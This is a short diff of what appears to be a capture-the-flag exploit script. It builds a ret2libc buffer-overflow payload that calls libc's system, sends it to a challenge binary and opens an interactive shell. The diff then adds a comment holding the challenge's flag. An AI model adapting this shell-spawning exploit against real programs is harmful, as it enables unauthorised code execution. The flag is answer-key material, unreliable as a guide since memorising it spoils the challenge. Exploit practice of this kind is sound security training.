@@ -20,3 +20,5 @@ pay = 'A'*0x38 + 'B'*4 + p32(libc_base + libc.symbols['system']) + p32(0x0804838
 p.sendafter('Hello BoB',pay)
 
 p.interactive()
+
+# bisc{This_is_simple_0ldschool_pwn!!}
